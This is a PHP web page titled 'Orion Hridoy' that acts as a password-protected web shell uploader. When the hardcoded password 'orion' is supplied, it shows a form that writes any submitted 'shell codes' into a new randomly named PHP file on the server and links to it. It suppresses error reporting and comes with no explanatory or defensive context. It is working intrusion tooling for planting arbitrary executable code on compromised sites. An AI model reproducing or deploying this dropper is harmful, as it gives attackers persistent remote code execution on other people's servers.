<!DOCTYPE html>
<html>
<style type="text/css">
.orion {
 width:200px;
 padding:5px;
}
textarea {
  width: 100%;
  height: 208px;
  resize: none;
  border: 0;
  border: 1px solid #2E2F22;
  border-radius: 10px;
  box-sizing: border-box;
  font-family: 'Open Sans', sans-serif;
  font-size: 16px;
  padding: 20px;
}
h1 {
	font-size: 4vw;
	font-weight: 900;
	background-color: #000;
	color: #fff;
	display: block;
}
.mytest {
    background-color: #EEEEEE;
    padding: 8px 20px;
    text-decoration:none;
    font-weight:bold;
    border-radius:5px;
    color: #10a2ff;
    cursor:pointer;
}

.priv {
    background-color:#000000;
    color: #FFFFFF;
}

.priv:hover {
    background-color:#62eb00;
    color: #FFFFFF;
}
</style>
<head>
	<title>Orion Hridoy</title>
</head>
<body>
<center>
<?php
error_reporting(0);
if ($_GET['orion']==='orion') {
$pika=rand()."orion.php";
echo '
<h1>File Creator</h1>
<form method="POST">
	<textarea name="shell_codes" placeholder="Shell Codes" rows="5" cols="100"></textarea><br><br>
	<input type="submit" class="orion" value="Execute">
</form>
';
if ($_POST["shell_codes"]) {
$shell = fopen($pika,"w");
fwrite($shell,"<title>Orion Hridoy</title>".$_POST['shell_codes']);
fclose($shell);
echo "<br><br><a class='mytest priv' target='_blank' href=".$pika.">Shell URL</a>";
}
}
else{
echo '
<h1>Enter Password</h1>
<form method="GET">
	<input type="password" class="orion" name="orion"><br><br>
	<input type="submit" class="orion" value="Access">
</form>
';
}
?>
</center>
</body>
</html>
